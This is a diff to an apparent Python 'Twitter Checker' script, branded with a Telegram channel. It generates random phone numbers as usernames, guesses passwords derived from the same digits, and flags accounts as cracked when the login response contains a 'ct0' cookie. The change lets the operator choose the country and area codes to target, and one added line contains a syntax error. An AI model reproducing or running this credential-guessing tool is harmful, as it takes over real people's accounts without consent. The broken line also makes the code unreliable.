@@ -360,15 +360,18 @@ def checker():
         clear()
         banner()
         def basla3():
+                ulk=input("Ülke Kodu Gir (Örnek 99 994 1 44): "):
+                bsk1=input("Bölge Kodu Gir (1tane) (Örnek 055 070 099): ")
                 while True:
                     try:
-                        ulk="964"
-                        bsk=("770","771","750","751","780")
-                        bsk1="".join(random.choice(bsk) for i in range(1))
                         rkm1="1234567890"
                         numr="".join(random.choice(rkm1) for i in range(7))
-                        user=ulk+bsk1+numr
-                        pas="0"+bsk1+numr
+                        if len(bsk1) ==2:
+                            user=ulk+"0"+bsk1+numr
+                            pas="0"+bsk1+numr
+                        else:
+                            user=ulk+bsk1+numr
+                            pas=bsk1+numr
                         HEA={
                             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                             'Accept-Encoding': 'gzip, deflate, br',
@@ -398,10 +401,10 @@ def checker():
                             time.sleep(10)
                         if "ct0" in veri:
                             ms="""
-    ╭─➢ ☄ ZET| Twitter Checker ☄
-    ├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
-    ├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
-    ╰─◉➤ Telegram Channel: @ZetTekno\n
+╭─➢ ☄ ZET| Twitter Checker ☄
+├◉[𝚄𝚜𝚎𝚛]➢ """+str(user)+"""
+├◉[𝙿𝚊𝚜𝚜]➢ """+str(pas)+"""
+╰─◉➤ Telegram Channel: @ZetTekno\n
             """
                             print(ms)
                             try:
